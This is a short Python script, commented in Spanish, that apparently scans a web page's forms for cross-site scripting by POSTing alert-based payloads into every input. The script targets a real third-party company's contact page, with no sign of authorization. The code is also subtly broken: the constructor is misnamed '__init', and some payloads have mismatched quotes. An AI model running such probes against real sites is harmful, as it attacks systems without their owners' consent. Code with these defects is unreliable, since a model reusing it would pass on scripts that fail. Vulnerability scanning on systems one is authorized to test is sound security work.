import requests
from bs4 import BeautifulSoup

class XSSScanner:
    def __init(self, base_url):
        self.base_url = base_url
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert('XSS')'>",
            "<a href='javascript:alert('XSS')'>Click me</a>",
            # Agrega más payloads aquí
        ]

    def scan_xss_vulnerabilities(self):
        try:
            # Realiza una solicitud GET al URL base.
            response = requests.get(self.base_url)

            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')

                # Busca todos los campos de entrada en formularios HTML.
                forms = soup.find_all('form')
                for form in forms:
                    inputs = form.find_all('input')
                    for input_field in inputs:
                        # Verifica si el campo de entrada es vulnerable a XSS almacenado o reflejado.
                        input_name = input_field.get('name')
                        if input_name:
                            self.test_xss(input_name)

        except requests.RequestException as e:
            print(f'Error al conectar al servidor: {e}')

    def test_xss(self, input_name):
        for payload in self.xss_payloads:
            # Envía una solicitud POST con el payload XSS de prueba para verificar si el campo es vulnerable.
            data = {input_name: payload}
            response = requests.post(self.base_url, data=data)

            if payload in response.text:
                print(f'Vulnerabilidad de XSS detectada en el campo: {input_name} con payload: {payload}')

if __name__ == "__main__":
    url = 'https://www.porsche.com/latin-america-es/_peru_/dialogue/contactandinformation/museum/contactandlocations/'  # Reemplaza con la URL que deseas analizar
    scanner = XSSScanner(url)
    scanner.scan_xss_vulnerabilities()
